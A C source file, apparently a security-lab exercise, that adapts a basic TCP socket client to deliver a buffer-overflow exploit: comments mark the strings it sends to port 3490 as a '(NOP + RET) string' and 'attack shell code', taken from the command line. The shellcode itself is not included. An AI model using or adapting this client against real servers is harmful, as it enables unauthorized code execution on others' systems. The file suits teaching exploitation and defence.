
/*
** client.c -- a stream socket client demo
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>

#define PORT 3490 // the port client will be connecting to 

#define MAXDATASIZE 100 // max number of bytes we can get at once 

int main(int argc, char *argv[])
{
  int sockfd, numbytes;  
  char buf[MAXDATASIZE];
  struct hostent *he;
  struct sockaddr_in their_addr; // connector's address information 

  if (argc != 5) {
    fprintf(stderr,"usage: echo_client hostname echo_string environment_string remote_prog\n");
    exit(1);
  }

  if ((he=gethostbyname(argv[1])) == NULL) {  // get the host info 
    perror("gethostbyname");
    exit(1);
  }

  if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
    perror("socket");
    exit(1);
  }

  their_addr.sin_family = AF_INET;    // host byte order 
  their_addr.sin_port = htons(PORT);  // short, network byte order 
  their_addr.sin_addr = *((struct in_addr *)he->h_addr);
  memset(&(their_addr.sin_zero), '\0', 8);  // zero the rest of the struct 

  if (connect(sockfd, (struct sockaddr *)&their_addr,
	      sizeof(struct sockaddr)) == -1) {
    perror("connect");
    exit(1);
  }

  char * buf1 = argv[2];
  int buf1len = strlen(buf1);
  uint32_t length = htonl(buf1len);
  // Send length
  if (send(sockfd, (char*) &length, sizeof(length), 0) == -1)
    perror("send");

  // Send (NOP + RET) string
  printf("Sending %d bytes\n", buf1len);
  if (send(sockfd, buf1, buf1len, 0) == -1)
    perror("send");

  char * buf2 = argv[3];
  int buf2len = strlen(buf2);
  length = htonl(buf2len);
  // Send length
  if (send(sockfd, (char*) &length, sizeof(length), 0) == -1)
    perror("send");

  printf("Sending %d bytes\n", buf2len);
  // Send attack shell code
  if (send(sockfd, buf2, buf2len, 0) == -1)
    perror("send");

  char * buf3 = argv[4];
  int buf3len = strlen(buf3);
  length = htonl(buf3len);
  // Send length
  if (send(sockfd, (char*) &length, sizeof(length), 0) == -1)
    perror("send");

  printf("Sending %d bytes\n", buf3len);
  // Send attack shell code
  if (send(sockfd, buf3, buf3len, 0) == -1)
    perror("send");

  // Receive echo string from server
  if ((numbytes=recv(sockfd, buf, MAXDATASIZE-1, 0)) == -1) {
    perror("recv");
    exit(1);
  }

  buf[numbytes] = '\0';

  printf("Received %d bytes from server\n", numbytes);

  close(sockfd);

  return 0;
} 
